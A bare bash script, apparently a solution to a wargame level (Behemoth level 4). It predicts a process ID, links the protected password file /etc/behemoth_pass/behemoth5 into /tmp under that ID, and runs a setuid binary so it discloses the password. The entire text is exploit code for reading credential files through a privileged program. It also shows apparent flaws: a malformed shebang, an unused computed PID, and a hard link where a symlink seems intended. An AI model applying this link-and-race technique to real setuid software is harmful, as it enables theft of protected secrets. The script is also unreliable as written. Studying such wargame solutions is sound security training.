!/bin/bash

curr=$(lsof > /dev/null & echo $!)

pid=$((curr+2))

ln -T /etc/behemoth_pass/behemoth5 "/tmp/$curr"
/behemoth/behemoth4

